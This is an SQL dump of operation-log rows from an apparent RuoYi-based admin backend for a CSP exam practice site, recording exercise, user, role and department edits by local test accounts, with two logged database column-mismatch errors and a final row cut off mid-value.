INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (371, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:20:42\",\"exerciseTitle\":\"<p>2</p>\",\"exerciseType\":1,\"id\":105,\"params\":{},\"parentId\":10,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":105}', 0, NULL, '2023-10-31 15:20:42', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (372, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:23:14\",\"exerciseProgram\":\"<p>hahahhaaa123</p>\",\"exerciseType\":-1,\"id\":10,\"isDelete\":0,\"params\":{},\"quesType\":1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:20:50\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:20:50', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (373, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:21:36\",\"exerciseTitle\":\"<p>123</p>\",\"exerciseType\":1,\"id\":106,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":106}', 0, NULL, '2023-10-31 15:21:36', 11);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (374, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:21:49\",\"exerciseTitle\":\"<p>333</p>\",\"exerciseType\":1,\"id\":107,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":107}', 0, NULL, '2023-10-31 15:21:49', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (375, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:23:07\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":1,\"id\":108,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":108}', 0, NULL, '2023-10-31 15:23:07', 20);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (376, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:21:36\",\"exerciseTitle\":\"<p>123333</p>\",\"exerciseType\":1,\"id\":106,\"isDelete\":0,\"params\":{},\"parentId\":6,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:24:26\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:24:26', 12);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (377, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:21:36\",\"exerciseTitle\":\"<p>123333</p>\",\"exerciseType\":1,\"id\":106,\"isDelete\":0,\"params\":{},\"parentId\":6,\"quesType\":-1,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-31 15:24:30\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:24:30', 12);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (378, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:24:36\",\"exerciseTitle\":\"<p>123</p>\",\"exerciseType\":1,\"id\":109,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":109}', 0, NULL, '2023-10-31 15:24:36', 23);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (379, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:25:18\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":1,\"id\":110,\"params\":{},\"parentId\":10,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":110}', 0, NULL, '2023-10-31 15:25:18', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (380, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:25:32\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":1,\"id\":111,\"params\":{},\"parentId\":10,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":111}', 0, NULL, '2023-10-31 15:25:32', 17);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (381, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/110', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:25:36', 18);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (382, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/111', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:27:18', 13);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (383, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/106', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:28:44', 11);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (384, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/109', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:28:50', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (385, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/108', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:28:54', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (386, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/108', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:29:00', 10);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (387, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:29:12\",\"exerciseTitle\":\"<p>ad</p>\",\"exerciseType\":1,\"id\":112,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":112}', 0, NULL, '2023-10-31 15:29:12', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (388, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/112', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:29:15', 10);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (389, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/112', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:30:20', 6);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (390, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/107', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:31:20', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (391, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"as\",\"choiceB\":\"asd\",\"choiceC\":\"asasd\",\"choiceD\":\"asd\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:31:28\",\"exerciseTitle\":\"<p>asd</p>\",\"exerciseType\":0,\"id\":113,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":113}', 0, NULL, '2023-10-31 15:31:28', 14);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (392, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"错误\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:31:34\",\"exerciseTitle\":\"<p>qwqwwqe</p>\",\"exerciseType\":1,\"id\":114,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":114}', 0, NULL, '2023-10-31 15:31:34', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (393, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/114', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:31:36', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (394, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/113', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:31:41', 10);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (395, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:32:39\",\"exerciseTitle\":\"<p>2131</p>\",\"exerciseType\":1,\"id\":115,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":115}', 0, NULL, '2023-10-31 15:32:39', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (396, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-10-31 15:32:46\",\"exerciseTitle\":\"<p>12311</p>\",\"exerciseType\":1,\"id\":116,\"params\":{},\"parentId\":6,\"quesType\":-1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":116}', 0, NULL, '2023-10-31 15:32:46', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (397, '题目管理', 3, 'com.ruoyi.project.csp.controller.ExerciseController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exercise/116', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:32:49', 16);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (398, '部门管理', 2, 'com.ruoyi.project.system.controller.SysDeptController.edit()', 'PUT', 1, 'admin', NULL, '/system/dept', '127.0.0.1', '内网IP', '{\"ancestors\":\"0,100\",\"children\":[],\"deptId\":200,\"deptName\":\"学生用户\",\"leader\":\"高飞\",\"orderNum\":2,\"params\":{},\"parentId\":100,\"parentName\":\"童辰科技\",\"phone\":\"15888888888\",\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:39:29', 22);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (399, '用户管理', 1, 'com.ruoyi.project.system.controller.SysUserController.add()', 'POST', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptId\":101,\"nickName\":\"test\",\"params\":{},\"postIds\":[],\"roleIds\":[100],\"status\":\"0\",\"userId\":100,\"userName\":\"test\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:40:04', 138);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (400, '角色管理', 2, 'com.ruoyi.project.system.controller.SysRoleController.edit()', 'PUT', 1, 'admin', NULL, '/system/role', '127.0.0.1', '内网IP', '{\"admin\":false,\"createTime\":\"2023-10-25 15:29:23\",\"dataScope\":\"1\",\"delFlag\":\"0\",\"deptCheckStrictly\":true,\"flag\":false,\"menuCheckStrictly\":true,\"menuIds\":[2009,2010,2011,2012,2013,2014,2015],\"params\":{},\"remark\":\"普通管理员，仅具备数据管理权限\",\"roleId\":100,\"roleKey\":\"common-admin\",\"roleName\":\"普通管理员\",\"roleSort\":2,\"status\":\"0\",\"updateBy\":\"admin\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 15:51:21', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (401, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asdasdas\",\"choiceA\":\"dasdasd\",\"choiceB\":\"dasd\",\"choiceC\":\"asdasdas\",\"choiceD\":\"asdasd\",\"correctAnswer\":\"D\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 10:33:00\",\"exerciseTitle\":\"<p>asdasdasdasdasdas</p>\",\"exerciseType\":0,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"remark\":\"1备注\",\"updateBy\":\"test\",\"updateTime\":\"2023-10-31 16:40:49\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 16:40:49', 35);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (402, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"test\",\"createTime\":\"2023-10-31 16:49:21\",\"exerciseProgram\":\"<p>asdas</p>\",\"exerciseType\":-1,\"params\":{},\"quesType\":1,\"remark\":\"123\"}', NULL, 1, '\n### Error updating database.  Cause: java.sql.SQLException: Column count doesn\'t match value count at row 1\n### The error may exist in file [/Users/zmy/Project/csp_online/csp-backend/target/classes/mybatis/csp/ExerciseMapper.xml]\n### The error may involve com.ruoyi.project.csp.mapper.ExerciseMapper.insertExercise-Inline\n### The error occurred while setting parameters\n### SQL: insert into tb_exercises          ( exercise_program,                                                                                                        exercise_type,             ques_type,             create_by,             create_time,                                       remark,             is_delete )           values ( ?,                                                                                                        ?,             ?,             ?,             ?,                                                    0 )\n### Cause: java.sql.SQLException: Column count doesn\'t match value count at row 1\n; bad SQL grammar []; nested exception is java.sql.SQLException: Column count doesn\'t match value count at row 1', '2023-10-31 16:49:21', 142);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (403, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"test\",\"createTime\":\"2023-10-31 16:49:31\",\"exerciseProgram\":\"<p>asdas</p>\",\"exerciseType\":-1,\"params\":{},\"quesType\":1,\"remark\":\"123\"}', NULL, 1, '\n### Error updating database.  Cause: java.sql.SQLException: Column count doesn\'t match value count at row 1\n### The error may exist in file [/Users/zmy/Project/csp_online/csp-backend/target/classes/mybatis/csp/ExerciseMapper.xml]\n### The error may involve com.ruoyi.project.csp.mapper.ExerciseMapper.insertExercise-Inline\n### The error occurred while setting parameters\n### SQL: insert into tb_exercises          ( exercise_program,                                                                                                        exercise_type,             ques_type,             create_by,             create_time,                                       remark,             is_delete )           values ( ?,                                                                                                        ?,             ?,             ?,             ?,                                                    0 )\n### Cause: java.sql.SQLException: Column count doesn\'t match value count at row 1\n; bad SQL grammar []; nested exception is java.sql.SQLException: Column count doesn\'t match value count at row 1', '2023-10-31 16:49:31', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (404, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"test\",\"createTime\":\"2023-10-31 16:51:08\",\"exerciseProgram\":\"<p>asdas</p>\",\"exerciseType\":-1,\"id\":117,\"params\":{},\"quesType\":1,\"remark\":\"123\"}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":117}', 0, NULL, '2023-10-31 16:51:08', 70);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (405, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111123hhhttt</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"remark\":\"备注123\",\"updateBy\":\"test\",\"updateTime\":\"2023-10-31 16:55:07\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 16:55:07', 59);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (406, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"B\",\"createBy\":\"test\",\"createTime\":\"2023-10-31 20:13:04\",\"exerciseTitle\":\"<p><img 